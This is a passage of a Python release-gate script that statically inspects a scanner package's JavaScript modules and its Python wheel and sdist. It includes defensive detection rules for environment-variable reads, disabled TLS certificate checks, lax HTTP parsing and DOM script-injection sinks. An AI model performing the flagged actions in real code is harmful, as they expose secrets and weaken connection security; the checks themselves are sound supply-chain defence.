    found = []
    for k, (kind, value, line) in enumerate(tokens):
        after = _at(tokens, k + 1)
        if kind != "name" or after is None:
            continue
        if value in ("require", "getBuiltinModule") and _is(after, "("):
            found.append((f"{value}()", None, line))
        if value not in ("import", "export") or _is(_at(tokens, k - 1), ".", "?.") or _is(after, ".", ":"):
            continue
        if value == "import" and _is(after, "("):
            found.append(("import()", None, line))
            continue
        if value == "export":  # only `export * [as name] from` and `export {…} from` load a module
            if _is(after, "*"):
                j = k + 4 if _at(tokens, k + 2) and tokens[k + 2][1] == "as" else k + 2
            elif _is(after, "{"):
                j = _close(tokens, k + 1)
            else:
                continue
            spec = _at(tokens, j + 1)
            if _at(tokens, j) and tokens[j][1] == "from" and spec and spec[0] == "str":
                found.append(("export … from", spec[1], line))
            continue
        j, module = k + 1, None
        while j < len(tokens) and not _is(tokens[j], ";"):
            token, spec = tokens[j], _at(tokens, j + 1)
            if token[0] == "str" and j == k + 1:
                module = token[1]
                break
            if token[0] == "name" and token[1] == "from" and spec and spec[0] == "str":
                module = spec[1]
                break
            j = _close(tokens, j) if _is(token, "{") else j + 1
        found.append(("import", module, line))
    return found


def judge_isolated_core(tokens: list) -> list:
    """What makes a module load another one: it must have none."""
    return [f"line {line}: {form}" + (f" {module!r}" if module else "") for form, module, line in js_imports(tokens)]


def judge_node_resolver(tokens: list) -> list:
    """The Node resolver's modules, environment reads and TLS/parser settings."""
    loaded = js_imports(tokens)
    problems = [f"line {line}: {form}" + ("" if form.endswith("()") else " (module unreadable)")
                for form, module, line in loaded if module is None]
    modules = {module for _form, module, _line in loaded if module is not None}
    problems += [f"imports {module}" for module in sorted(modules - NODE_RESOLVER_IMPORTS)]
    problems += [f"does not import {module}" for module in sorted(NODE_RESOLVER_IMPORTS - modules)]
    literal, seen = {"rejectUnauthorized": "true", "insecureHTTPParser": "false"}, set()
    for k, (kind, value, line) in enumerate(tokens):
        prev, after, then = _at(tokens, k - 1), _at(tokens, k + 1), _at(tokens, k + 2)
        is_key = kind == "name" or (kind == "str" and (_is(prev, "[") or _is(after, ":")))
        member = _member(tokens, k) if _ends_expression(tokens[k]) else None
        if member == "env":  # on any object: process.env, or process reached another way
            problems.append(f"line {line}: {value if kind == 'name' else '…'}.env")
        elif (kind == "name" and value == "process" and member != "versions" and not _is(prev, ".", "?.")
              and not (_is(prev, "{", ",") and _is(after, ":"))):
            # The global itself, except to read its versions: `const { env } = process`,
            # process[`env`] or an alias would reach the environment.
            problems.append(f"line {line}: process other than process.versions")
        elif kind == "name" and value == "env" and not _is(prev, ".", "?."):
            problems.append(f"line {line}: env")  # destructured or renamed: `const { env } = host`
        elif is_key and value in ("globalAgent", "proxyEnv"):
            problems.append(f"line {line}: {value}")
        elif is_key and value == "agent" and _is(after, ":", "=") and then and then[:2] == ("name", "false"):
            problems.append(f"line {line}: agent: false")
        elif is_key and value in literal:
            # Every mention is the literal itself: a value read from a caller, an expression or
            # the opposite literal could turn certificate checks or strict parsing off.
            if _is(after, ":") and then and then[0] == "name" and then[1] == literal[value] and not _is(prev, "."):
                seen.add(value)
            else:
                problems.append(f"line {line}: {value} is not the literal {literal[value]}")
    problems += [f"no {key}: {want}" for key, want in literal.items() if key not in seen]
    return problems


def judge_browser_floor(tokens: list) -> list:
    """The syntax past ES2020 and the newer APIs listed above (FLOOR_*), in the forms this reader
    knows. A list, not proof: an API it does not name passes."""
    problems = []
    for k, (kind, value, line) in enumerate(tokens):
        prev, after = _at(tokens, k - 1), _at(tokens, k + 1)
        quoted = _quoted(tokens[k]) if _is(prev, "[") and _is(after, "]") and _member_bracket(tokens, k - 1) else None
        if kind == "punct" and value in ("||=", "&&=", "??="):
            problems.append(f"line {line}: logical assignment {value}")
        elif kind == "num" and "_" in value:
            problems.append(f"line {line}: numeric separator {value}")
        elif kind == "private":
            problems.append(f"line {line}: private class member {value}")
        elif kind == "regex":
            problems += [f"line {line}: {problem}" for problem in _regex_floor(value)]
        elif quoted in FLOOR_NAMES:  # a quoted member reads like the name: xs['toSorted']()
            problems.append(f"line {line}: {quoted}")
        elif quoted in FLOOR_METHODS and _is(_at(tokens, k + 2), "("):
            problems.append(f"line {line}: .{quoted}()")
        elif kind != "name":
            continue
        elif value in FLOOR_GLOBALS and (value, _member(tokens, k)) in FLOOR_STATICS:
            problems.append(f"line {line}: {value}.{_member(tokens, k)}")
        elif value in FLOOR_NAMES:
            problems.append(f"line {line}: {value}")
        elif value in FLOOR_METHODS and _is(prev, ".", "?.") and _is(after, "("):
            problems.append(f"line {line}: .{value}()")
        elif value == "RegExp" and _is(after, "("):
            # new RegExp(source, flags) with literal flags: a quoted string or a plain template.
            arguments = _call_arguments(tokens, k + 1)
            flags = arguments[1] if len(arguments) > 1 else []
            text = flags[0][1].removesuffix("`") if len(flags) == 1 and flags[0][0] in ("str", "template") else ""
            problems += [f"line {line}: RegExp {flag} flag" for flag in "dv" if flag in text]
        elif value == "class" and not _is(prev, ".", "?.") and after and (after[0] == "name" or _is(after, "{")):
            problems += _class_fields(tokens, k)  # a declaration or expression, not a `class` key
    return problems + [f"line {line}: top-level await" for line in _top_level_awaits(tokens)]


def _regex_floor(literal: str) -> list:
    """What a regular expression LITERAL needs past ES2020: the d and v flags, a modifier group
    or a group name used twice. An older engine refuses each when it parses the module."""
    end = literal.rindex("/")
    body, problems = literal[1:end], [f"RegExp {flag} flag" for flag in "dv" if flag in literal[end + 1:]]
    names, i, in_class = [], 0, False
    while i < len(body):
        ch = body[i]
        if ch == "\\":  # an escaped character, in a class or not
            i += 2
            continue
        if in_class:
            in_class = ch != "]"
        elif ch == "[":
            in_class = True
        elif ch == "(":
            modifiers = JS_REGEX_MODIFIERS.match(body, i)
            if modifiers and (modifiers.group(1) or modifiers.group(2)):
                problems.append(f"RegExp modifier group {modifiers.group()}")
            elif named := JS_REGEX_GROUP_NAME.match(body, i):
                names.append(named.group(1))
        i += 1
    twice = sorted({name for name in names if names.count(name) > 1})
    return problems + [f"RegExp group name {name!r} used twice" for name in twice]


def _call_arguments(tokens: list, k: int) -> list:
    """The top-level arguments of the call whose `(` is tokens[K], each a token list."""
    arguments, current, end = [], [], _close(tokens, k) - 1
    depth = 0
    for token in tokens[k + 1:end]:
        depth += _is(token, "(", "[", "{") - _is(token, ")", "]", "}")
        if depth == 0 and _is(token, ","):
            arguments.append(current)
            current = []
        else:
            current.append(token)
    return arguments + ([current] if current else [])


def _class_fields(tokens: list, k: int) -> list:
    """A field or static block in the body of the class whose keyword is tokens[K]: each body
    member must be a method (fields and static blocks are ES2022)."""
    j, depth = k + 1, 0
    while j < len(tokens) and not (depth == 0 and _is(tokens[j], "{")):
        depth += _is(tokens[j], "(", "[", "{") - _is(tokens[j], ")", "]", "}")
        j += 1
    end, j = _close(tokens, j) - 1, j + 1
    while j < end:
        line = tokens[j][2]
        if _is(tokens[j], ";"):
            j += 1
            continue
        if tokens[j][1] == "static" and _is(_at(tokens, j + 1), "{"):
            return [f"line {line}: class static block"]
        # static, async, get and set are modifiers when a member name follows, else the name.
        while tokens[j][1] in ("static", "async", "get", "set") and not _is(_at(tokens, j + 1), "(", "=", ";", "}"):
            j += 1
        j += _is(tokens[j], "*")
        j = _close(tokens, j) if _is(tokens[j], "[") else j + 1
        if not _is(_at(tokens, j), "("):
            return [f"line {line}: class field"]
        j = _close(tokens, _close(tokens, j))  # the parameters, then the body
    return []


def _top_level_awaits(tokens: list) -> list:
    """Lines of each `await` outside every function body (top-level await is ES2022). An arrow
    function's expression body ends at a comma or semicolon of its own level, or at the bracket
    that closes around it."""
    lines, stack, closed = [], [], None  # stack: (kind, index) per open bracket or arrow body
    for k, (kind, value, line) in enumerate(tokens):
        if kind == "name" and value == "await":
            if not (_is(_at(tokens, k - 1), ".", "?.") or _is(_at(tokens, k + 1), ":")
                    or any(entry in ("function", "=>") for entry, _k in stack)):
                lines.append(line)
        elif kind != "punct":
            continue
        elif value in ("(", "["):
            stack.append((value, k))
        elif value == "{":
            stack.append(("function" if _opens_function(tokens, k, closed) else "{", k))
        elif value in (")", "]", "}", ",", ";"):
            while stack and stack[-1][0] == "=>":
                stack.pop()
            if value in (")", "]", "}") and stack:
                opener = stack.pop()[1]
                closed = opener if value == ")" else None
        elif value == "=>" and not _is(_at(tokens, k + 1), "{"):
            stack.append(("=>", k))
    return lines


def _opens_function(tokens: list, k: int, paren) -> bool:
    """tokens[K] (a `{`) opens a function body: it follows `=>`, or the `)` of a parameter list
    (PAREN is its `(`) rather than of an if/for/while/switch/catch/with head."""
    prev = _at(tokens, k - 1)
    if _is(prev, "=>"):
        return True
    if not _is(prev, ")") or paren is None:
        return False
    head, before = _at(tokens, paren - 1), _at(tokens, paren - 2)
    if head is not None and head[0] == "name" and head[1] in ("if", "for", "while", "switch", "catch", "with"):
        return False
    return not (head is not None and head[1] == "await" and before is not None and before[1] == "for")


def check_destination_modules(art: Artifact, files: dict) -> None:
    """The destination modules, read statically as they ship. A source the reader cannot read
    fails: an unread module is not a judged one."""
    for name, check, judge in (
        ("destination.js", "destination.js imports nothing (no import declaration, import(), require() or "
                           "export … from)", judge_isolated_core),
        ("destination.js", "destination.js stays inside the browser floor (none of the refused post-ES2020 "
                           "syntax or newer browser APIs)", judge_browser_floor),
        ("destination-node.js", "destination-node.js loads only node:http, node:https, node:dns and "
                                "./destination.js; reads no env, global agent or proxy settings (process only "
                                "for its versions); keeps certificate checks and strict HTTP parsing literal",
         judge_node_resolver),
    ):
        data = files.get(name)
        problems = ([f"no {name} in the archive"] if data is None
                    else list(read_module(judge, data.decode("utf-8", errors="replace"))))
        shown = problems[:12] + ([f"… {len(problems) - 12} more"] if len(problems) > 12 else [])
        art.check(check, not problems, "; ".join(shown))


# The example pages and scripts run with no bundler in front of them: a bare specifier never
# resolves there, and an absolute URL leaves the package folder. So each load read here names a
# file the package ships, by a relative path (or is a data: URL): an import, a
# `new URL('…', import.meta.url)`, the literal first argument of a call that loads it (fetch,
# importScripts, sendBeacon, Worker, SharedWorker, WebSocket, EventSource), and the pages' src
# attributes and link hrefs. A first argument held in a variable is read where its value is
# made, if in one of these forms. The scripts keep to the destination core's browser floor.
# Known forms only, like the floor. Each page's Content-Security-Policy refuses the requests it
# does not allow (the camera page's allows other http(s) hosts for the destination checks a user
# starts, which go through ../destination.js); it does not govern the module worker, which takes
# its policy from its own response, so a request the worker makes in another form is seen only by
# a run in a browser, on the paths that run drives.
WASM_EXAMPLE_SCRIPTS = ("examples/headless.js", "examples/camera.js", "examples/scanner.worker.js")
WASM_EXAMPLE_PAGES = ("examples/headless.html", "examples/camera.html")
# The server-rendering example runs under Node from the installed folder, where the package
# resolves its own name. After its traps are set, it loads exactly these subpaths, in this order,
# each with one import() of a literal, and no other module: no static import (that would run
# before the traps), require() or node: module.
WASM_SSR_EXAMPLE = "examples/ssr.mjs"
WASM_SSR_IMPORTS = tuple(f"{WASM_NAME}/{name}" for name in ("camera", "camera-overlay", "destination"))
IMPORT_META_URL = (("name", "import"), ("punct", "."), ("name", "meta"), ("punct", "."), ("name", "url"))
EXAMPLE_LOAD_CALLS = frozenset({"fetch", "importScripts", "sendBeacon", "Worker", "SharedWorker", "WebSocket",
                                "EventSource"})
# A decoded value is shown as text and never opened: the scripts parse no markup, make no link
# and navigate nowhere. Refused wherever they appear, an object key or a quoted member included;
# open, write and writeln only when called; setAttribute and setAttributeNS when the attribute
# they set takes a URL or a script, or is computed.
EXAMPLE_REFUSED_NAMES = frozenset({"innerHTML", "outerHTML", "insertAdjacentHTML", "createContextualFragment",
                                   "DOMParser", "srcdoc", "href", "location", "navigation"})
EXAMPLE_REFUSED_CALLS = frozenset({"open", "write", "writeln"})
EXAMPLE_URL_ATTRIBUTES = frozenset({"href", "src", "srcset", "srcdoc", "action", "formaction", "ping", "poster",
                                    "data", "background", "codebase", "cite"})


def judge_example_dom(tokens: list) -> list:
    """Each markup sink, link or navigation the example scripts would reach, in the forms above."""
    problems = []
    for k, (kind, value, line) in enumerate(tokens):
        prev, after = _at(tokens, k - 1), _at(tokens, k + 1)
        quoted = _quoted(tokens[k]) if _is(prev, "[") and _is(after, "]") and _member_bracket(tokens, k - 1) else None
        name, paren = (value, k + 1) if kind == "name" else (quoted, k + 2)
        called = _is(_at(tokens, paren), "(")
        if name in EXAMPLE_REFUSED_NAMES:
            problems.append(f"line {line}: {name}")
        elif name in EXAMPLE_REFUSED_CALLS and called:
            problems.append(f"line {line}: {name}()")
        elif name in ("setAttribute", "setAttributeNS") and called:
            arguments = _call_arguments(tokens, paren)
            position = 1 if name == "setAttributeNS" else 0
            attribute = arguments[position] if len(arguments) > position else []
            text = _quoted(attribute[0]) if len(attribute) == 1 else None
            local = None if text is None else text.lower().rsplit(":", 1)[-1]
            if local is None:
                problems.append(f"line {line}: {name}() of a computed attribute")
            elif local in EXAMPLE_URL_ATTRIBUTES or local.startswith("on"):
                problems.append(f"line {line}: {name}({text!r})")
    return problems


class _PageLoads(html.parser.HTMLParser):
    """(line, value) of each src attribute and link href in a page: what it loads, not where
    an anchor would take a reader."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.found = []

    def handle_starttag(self, tag, attrs):
        line = self.getpos()[0]
        self.found += [(line, value or "") for key, value in attrs if key == "src" or (tag == "link" and key == "href")]

    handle_startendtag = handle_starttag


def example_loads(name: str, source: str) -> list:
    """(line, reference) for each load of the example file NAME in the forms read here; the
    reference is None where the form names no literal path (a computed import or URL)."""
    if name.endswith(".html"):
        page = _PageLoads()
        page.feed(source)
        page.close()
        return page.found
    tokens = js_tokens(source)
    found = [(line, module) for _form, module, line in js_imports(tokens)]
    for k, (kind, value, line) in enumerate(tokens):
        before = _at(tokens, k - 1)
        if kind != "name" or not _is(_at(tokens, k + 1), "("):
            continue
        if value in EXAMPLE_LOAD_CALLS:
            # A literal first argument is the path; one that starts with a literal and goes on
            # (a concatenation, a template with substitutions) is computed from it.
            first = (_call_arguments(tokens, k + 1) or [[]])[0]
            if len(first) == 1 and _quoted(first[0]) is not None:
                found.append((line, _quoted(first[0])))
            elif first and first[0][0] in ("str", "template"):
                found.append((line, None))
            continue
        if value != "URL" or before is None or before[:2] != ("name", "new"):
            continue
        arguments = _call_arguments(tokens, k + 1)
        if len(arguments) == 2 and tuple(token[:2] for token in arguments[1]) == IMPORT_META_URL:
            found.append((line, _quoted(arguments[0][0]) if len(arguments[0]) == 1 else None))
    return found


def example_load_problems(name: str, source: str, shipped) -> list:
    """Each load of the example file NAME that is not a relative path to a file in SHIPPED."""
    try:
        loads = example_loads(name, source)
    except ValueError as error:
        return [f"{name}: not readable as JavaScript: {error}"]
    problems = []
    for line, reference in loads:
        where = f"{name} line {line}"
        if reference is None:
            problems.append(f"{where}: a load that names no literal path")
        elif reference.startswith("data:"):
            continue
        elif not reference.startswith(("./", "../")):
            problems.append(f"{where}: {reference!r} is not a relative path")
        else:
            target = posixpath.normpath(posixpath.join(posixpath.dirname(name), re.split(r"[?#]", reference)[0]))
            if target.startswith("..") or target not in shipped:
                problems.append(f"{where}: {reference!r} names no file the package ships")
    return problems


def ssr_example_problems(source: str) -> list:
    """How the modules the server-rendering example loads differ from WASM_SSR_IMPORTS."""
    try:
        tokens = js_tokens(source)
        loaded = js_imports(tokens)
    except ValueError as error:
        return [f"not readable as JavaScript: {error}"]
    problems = [f"line {line}: {form}" + (f" {module!r}" if module else "")
                for form, module, line in loaded if form != "import()"]
    literals = []
    for k, (kind, value, line) in enumerate(tokens):
        if kind != "name" or value != "import" or not _is(_at(tokens, k + 1), "("):
            continue
        if _is(_at(tokens, k - 1), ".", "?."):
            continue
        arguments = _call_arguments(tokens, k + 1)
        literal = _quoted(arguments[0][0]) if len(arguments) == 1 and len(arguments[0]) == 1 else None
        if literal is None:
            problems.append(f"line {line}: an import() that names no literal module")
        else:
            literals.append(literal)
    if literals != list(WASM_SSR_IMPORTS):
        problems.append(f"import() of {', '.join(literals) or 'nothing'}; expected {', '.join(WASM_SSR_IMPORTS)}")
    return problems


def check_example(art: Artifact, files: dict) -> None:
    """The examples, read statically as they ship. A file the reader cannot read fails."""
    for name in WASM_EXAMPLE_SCRIPTS:
        data = files.get(name)
        problems = ([f"no {name} in the archive"] if data is None
                    else list(read_module(judge_browser_floor, data.decode("utf-8", errors="replace"))))
        shown = problems[:12] + ([f"… {len(problems) - 12} more"] if len(problems) > 12 else [])
        art.check(f"{name} stays inside the browser floor (none of the refused post-ES2020 syntax or newer "
                  "browser APIs)", not problems, "; ".join(shown))
        problems = ([f"no {name} in the archive"] if data is None
                    else list(read_module(judge_example_dom, data.decode("utf-8", errors="replace"))))
        art.check(f"{name} parses no markup, makes no link and navigates nowhere (no innerHTML, href, location, "
                  "open(), setAttribute() of a URL or script attribute, or similar)", not problems, "; ".join(problems[:12]))
    problems = []
    for name in (*WASM_EXAMPLE_PAGES, *WASM_EXAMPLE_SCRIPTS):
        data = files.get(name)
        problems += ([f"no {name} in the archive"] if data is None
                     else example_load_problems(name, data.decode("utf-8", errors="replace"), files))
    shown = problems[:12] + ([f"… {len(problems) - 12} more"] if len(problems) > 12 else [])
    art.check("the example loads only files the package ships, each by a relative path (imports, "
              "new URL(…, import.meta.url), the literal first argument of fetch, importScripts, sendBeacon, Worker, "
              "SharedWorker, WebSocket and EventSource, the page's src attributes and link hrefs)", not problems,
              "; ".join(shown))
    data = files.get(WASM_SSR_EXAMPLE)
    problems = ([f"no {WASM_SSR_EXAMPLE} in the archive"] if data is None
                else ssr_example_problems(data.decode("utf-8", errors="replace")))
    art.check(f"{WASM_SSR_EXAMPLE} loads exactly ./camera, ./camera-overlay and ./destination by the package's name, "
              "in that order, each with one import() of a literal, and no other module", not problems,
              "; ".join(problems[:12]))


def metadata(data: bytes):
    return email.parser.BytesParser().parsebytes(data)


def cyclonedx_root(data) -> tuple:
    """(name, version) of a CycloneDX SBOM's root component (metadata.component), and why
    there is none: DATA absent, not JSON or not a CycloneDX document with a root component."""
    if data is None:
        return None, "absent"
    try:
        bom = json.loads(data)
    except ValueError as error:
        return None, f"not JSON: {error}"
    meta = bom.get("metadata") if isinstance(bom, dict) else None
    component = meta.get("component") if isinstance(meta, dict) else None
    if not isinstance(component, dict) or bom.get("bomFormat") != "CycloneDX":
        return None, "not a CycloneDX document with a root component (metadata.component)"
    return (component.get("name"), component.get("version")), ""


def check_python_metadata(art: Artifact, host: Host, meta) -> None:
    art.check(f"Name = {PYPI_NAME}", meta.get("Name") == PYPI_NAME, f"{meta.get('Name')}")
    art.check(f"Version = {host.version} (workspace)", meta.get("Version") == host.version, f"{meta.get('Version')}")
    expression = meta.get("License-Expression") or meta.get("License")
    art.check(f"License-Expression = {SPDX}", expression == SPDX, f"{expression}")
    files = meta.get_all("License-File") or []
    art.check("License-File names LICENSE", "LICENSE" in files, f"License-File: {files}")


def inspect_wheel(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    files = read_zip(path)
    art = host.add(Artifact(f"wheel {path.name}", "wheel"))
    art.notes.extend(notes)
    art.package = {"filename": path.name}
    describe(art, path, files)
    art.check(f"file name is {PY_MODULE}-{host.version}-<tags>.whl (never the retired {RETIRED_MODULE})",
              path.name.startswith(f"{PY_MODULE}-{host.version}-"), path.name)
    retired = sorted({n.split("/", 1)[0] for n in files if n.startswith(RETIRED_MODULE)})
    art.check(f"no {RETIRED_MODULE} package, extension or library folder (a retired module name)", not retired,
              ", ".join(retired))
    dist_info = sorted({n.split("/", 1)[0] for n in files if re.match(r"[^/]+\.dist-info/METADATA$", n)})
    if not art.check("one .dist-info/METADATA", len(dist_info) == 1, ", ".join(dist_info)):
        return art
    info = dist_info[0]
    art.check(f"metadata folder is {PY_MODULE}-{host.version}.dist-info", info == f"{PY_MODULE}-{host.version}.dist-info",
              info)
    meta = metadata(files[f"{info}/METADATA"])
    check_python_metadata(art, host, meta)
    check_readme(art, meta.get_payload().encode(), ("pypi", PYPI_NAME), where="METADATA description")
    # The platform the next checks rely on is the one pip installs by (the
    # file name), and the WHEEL metadata must say the same.
    tags = {line.split(":", 1)[1].strip() for line in files.get(f"{info}/WHEEL", b"").decode().splitlines()
            if line.startswith("Tag:")}
    art.check("WHEEL tags are the file name's", bool(tags) and tags == wheel_tags(path.name),
              f"WHEEL {sorted(tags)} · file name {sorted(wheel_tags(path.name))}")
    # PEP 639: each License-File value names a file under .dist-info/licenses/.
    for value in meta.get_all("License-File") or ["LICENSE"]:
        check_license(art, files.get(f"{info}/licenses/{value}"), f"{info}/licenses/{value} (License-File {value})")
    for typed in (f"{PY_MODULE}/__init__.pyi", f"{PY_MODULE}/py.typed"):
        art.check(f"{typed} present (type stubs)", typed in files)
    # The type stubs a consumer's type checker reads, and the import shim that
    # runs on `import qrcode_barcode_scanner`, are the checkout's: the stub and
    # the marker byte for byte after CRLF normalisation (a Windows checkout
    # writes the stub CRLF), the shim the fixed text maturin generates.
    def _nl(data):
        return data.replace(b"\r\n", b"\n") if data is not None else None
    for stub, source in ((f"{PY_MODULE}/__init__.pyi", PY_DIR / f"{PY_MODULE}.pyi"),
                         (f"{PY_MODULE}/py.typed", PY_DIR / "py.typed")):
        same = source.is_file() and _nl(files.get(stub)) == _nl(source.read_bytes())
        art.check(f"{stub} is {rel(source)}, byte for byte (CRLF-normalised)", same,
                  "" if same else f"differs from {rel(source)}" if stub in files else "absent")
    shim = files.get(f"{PY_MODULE}/__init__.py") == MATURIN_INIT_PY
    art.check(f"{PY_MODULE}/__init__.py is the import shim maturin generates", shim,
              "" if shim else "differs from maturin's generated __init__.py")
    modules = [n for n in files if re.match(rf"{PY_MODULE}/{PY_MODULE}\.[^/]*(so|pyd)$", n)]
    art.check(f"exactly one compiled extension module ({PY_MODULE}/{PY_MODULE}.<tag>.so or .pyd)",
              len(modules) == 1, ", ".join(modules))
    # auditwheel's grafts, and nothing else, under qrcode_barcode_scanner.libs/:
    # only in a Linux wheel it repaired, each named <name>-<8 hex>.so[.N] and
    # listed in RECORD like every file maturin wrote.
    linux = bool(tags) and all(t.rsplit("-", 1)[1].startswith(("manylinux", "musllinux")) for t in tags)
    record = {row.split(",", 1)[0] for row in files.get(f"{info}/RECORD", b"").decode().splitlines()}
    libs = sorted(n for n in files if n.startswith(f"{PY_MODULE}.libs/"))
    bad = [f"{n}: not a manylinux or musllinux wheel" for n in libs if not linux]
    bad += [f"{n}: not <name>-<8 hex>.so[.N]" for n in libs if not GRAFTED_LIB.fullmatch(n)]
    bad += [f"{n}: not listed in RECORD" for n in libs if n not in record]
    if libs:
        art.check(f"{PY_MODULE}.libs/ holds only auditwheel grafts (Linux wheel · <name>-<8 hex>.so[.N] · "
                  "in RECORD)", not bad, "; ".join(bad))
    # The Rust SBOM is the binding package's own: present under its name (the
    # file set below admits no other) and rooted at that package and version.
    root, why = cyclonedx_root(files.get(f"{info}/{PY_SBOM}"))
    art.check(f"SBOM {PY_SBOM} present, root component {PY_SBOM_ROOT} {host.version}",
              root == (PY_SBOM_ROOT, host.version), why or f"root component {root[0]} {root[1]}")
    # The whole wheel, exactly: the dist-info maturin writes, the license
    # files, the SBOM, and the package (init · stubs · marker · extension).
    exact = {f"{info}/{n}" for n in ("METADATA", "WHEEL", "RECORD", PY_SBOM)} | {
        f"{info}/licenses/{v}" for v in meta.get_all("License-File") or []} | {
        f"{PY_MODULE}/{n}" for n in ("__init__.py", "__init__.pyi", "py.typed")}
    patterns = (re.compile(rf"{PY_MODULE}/{PY_MODULE}(\.[^/]+)?\.(so|pyd)"),)
    extra = sorted(n for n in files if n not in exact and n not in libs and not any(p.fullmatch(n) for p in patterns))
    art.check("file set is exactly the wheel allowlist (dist-info · licenses · sbom · package · grafts)", not extra,
              f"unexpected: {', '.join(extra)}" if extra else "")
    check_stray(art, files)
    return art


def inspect_sdist(host: Host, path: pathlib.Path, notes=()) -> Artifact:
    files, top, special = read_tar(path)
    art = host.add(Artifact(f"sdist {path.name}", "sdist"))
    art.notes.extend(notes)
    art.package = {"filename": path.name}
    describe(art, path, files)
    check_members(art, special)
    art.check(f"file name is {PY_MODULE}-{host.version}.tar.gz (never the retired {RETIRED_MODULE})",
              path.name == f"{PY_MODULE}-{host.version}.tar.gz", path.name)
    art.check(f"archive root is {PY_MODULE}-{host.version}", top == f"{PY_MODULE}-{host.version}", top)
    # The vendored crate directories keep their names (qrcode-ai-scanner/,
    # qrcode-ai-scanner-py/): only a Python module or stub of the retired
    # name is refused.
    retired = sorted({n.split("/", 1)[0] for n in files if n.startswith(RETIRED_MODULE)})
    art.check(f"no {RETIRED_MODULE} module or stub (a retired module name)", not retired, ", ".join(retired))
    meta = metadata(files["PKG-INFO"]) if "PKG-INFO" in files else None
    if meta is not None:
        check_python_metadata(art, host, meta)
        check_readme(art, meta.get_payload().encode(), ("pypi", PYPI_NAME), where="PKG-INFO description")
    else:
        art.check("PKG-INFO present", False)
    for required in ("pyproject.toml", "README.md"):
        art.check(f"{required} present", required in files)
    check_readme(art, files.get("README.md"), ("pypi", PYPI_NAME))
    # PEP 639: License-File values and the pyproject's license-files globs are
    # relative to the sdist root, where the rewritten pyproject.toml sits. A
    # copy only inside the binding crate directory does not satisfy them, and a
    # build from this sdist would find no license file.
    for value in (meta.get_all("License-File") or []) if meta is not None else []:
        check_license(art, files.get(value), f"License-File {value} at the sdist root")
    project = tomllib.loads(files.get("pyproject.toml", b"").decode() or "").get("project", {})
    globs = project.get("license-files")
    art.check("pyproject.toml declares license-files (PEP 639)", isinstance(globs, list) and bool(globs), f"{globs}")
    licensed = set()
    for pattern in globs if isinstance(globs, list) else []:
        matched = sorted(n for n in files if glob_regex(pattern).fullmatch(n))
        if art.check(f"license-files {pattern!r} matches a file at the sdist root", bool(matched),
                     ", ".join(matched)):
            for name in matched:
                check_license(art, files[name], f"{name} (license-files {pattern!r})")
        licensed |= set(matched)
    check_license(art, files.get("qrcode-ai-scanner/LICENSE"), "qrcode-ai-scanner/LICENSE (vendored core)")
    # Maturin's pure-Rust wheel builder resolves stubs beside pyproject.toml,
    # which the sdist relocates above the vendored binding manifest.
    for stub in (f"{PY_MODULE}.pyi", "py.typed"):
        check_equal_file(art, f"{stub} at the sdist project root", files.get(stub), PY_DIR / stub)
    check_tracked(art, files, SDIST_CRATES, MATURIN_SDIST_ROOT | MATURIN_SDIST_TYPING | licensed | {
        prefix + name for prefix in SDIST_CRATES for name in CARGO_GENERATED})
    # Every packed file is the checkout's, byte for byte — the source a build
    # from the sdist compiles where no wheel fits — except what maturin
    # generates or rewrites (the root metadata and the two Cargo.toml) and the
    # license files already compared above.
    mismatched = []
    for inner, data in files.items():
        if inner in MATURIN_SDIST_GENERATED or inner in licensed or inner == "LICENSE":
            continue
        source = next((ROOT / directory / inner[len(prefix):] for prefix, directory in SDIST_CRATES.items()
                       if inner.startswith(prefix)), None)
        if source is not None and (not source.is_file() or source.read_bytes() != data):
            mismatched.append(inner)
    art.check("every packed file is the checkout's, byte for byte (bar what maturin rewrites or generates)",
              not mismatched, f"differ from the checkout: {', '.join(sorted(mismatched))}" if mismatched else "")
    py_manifest = tomllib.loads(files.get("qrcode-ai-scanner-py/Cargo.toml", b"").decode() or "")
    rxing = py_manifest.get("profile", {}).get("release", {}).get("package", {}).get("rxing", {})
    art.check("the shipped binding manifest keeps rxing overflow-checks (an sdist build is its own root)",
              rxing.get("overflow-checks") is True, f"profile.release.package.rxing = {rxing}")
    check_stray(art, files)
    return art


def cmd_python(host: Host) -> None:
    maturin = which("maturin")
    if not maturin:
        host.add(Artifact(f"wheel {PYPI_NAME} {host.version}", "wheel")).unavailable("maturin not on PATH")
        host.add(Artifact(f"sdist {PYPI_NAME} {host.version}", "sdist")).unavailable("maturin not on PATH")
        return
    dest = (host.out / "archives" if host.out else host.scratch) / "python"
    proc = host.run("maturin-sdist", [maturin, "sdist", "--out", str(dest)], cwd=PY_DIR)
    sdists = sorted(dest.glob("*.tar.gz"))
    if proc.returncode != 0 or len(sdists) != 1:
        host.add(Artifact(f"sdist {PYPI_NAME}", "sdist")).check("maturin sdist", False, tail(proc))
    else:
        inspect_sdist(host, sdists[0], notes=["maturin sdist"])
    proc = host.run("maturin-build", [maturin, "build", "--release", "--locked", "--out", str(dest)], cwd=PY_DIR)
    wheels = sorted(dest.glob("*.whl"))
    if proc.returncode != 0 or len(wheels) != 1:
        host.add(Artifact(f"wheel {PYPI_NAME}", "wheel")).check("maturin build --release --locked", False, tail(proc))
    else:
        inspect_wheel(host, wheels[0], notes=["maturin build --release --locked (host wheel)"])


# ---------------------------------------------------------------- pypi-live


def pypi_live_files(host: Host):
    """{file name: (sha256, yanked)} of what PyPI serves at host.version, or
    None on a 404 (PyPI has no such version: nothing is live). Any other answer
    raises OSError or ValueError: what cannot be read cannot be compared."""
    url = PYPI_JSON.format(project=PYPI_NAME, version=host.version)
    request = urllib.request.Request(url, headers={"Accept": "application/json",
                                                   "User-Agent": "qrcode-barcode-scanner-ci (release gate)"})
    try:
        with host.opener(request, timeout=60) as response:
            payload = json.load(response)
    except urllib.error.HTTPError as err:
        if err.code == 404:
            return None
        raise
    if not isinstance(payload, dict) or not isinstance(payload.get("urls"), list):
        raise ValueError("the answer holds no `urls` list")
    info = payload.get("info")
    answered = info.get("version") if isinstance(info, dict) else None
    if answered != host.version:
        raise ValueError(f"the answer is for version {answered!r}, not {host.version}")
    files = {}
    for entry in payload["urls"]:
        entry = entry if isinstance(entry, dict) else {}
        digests = entry.get("digests") if isinstance(entry.get("digests"), dict) else {}
        name, digest = entry.get("filename"), digests.get("sha256")
        if not isinstance(name, str) or not isinstance(digest, str) or not re.fullmatch(r"[0-9a-f]{64}", digest):
            raise ValueError(f"a `urls` entry without a file name and a sha256: {json.dumps(entry)[:160]}")
        if name in files:
            raise ValueError(f"{name} listed twice")
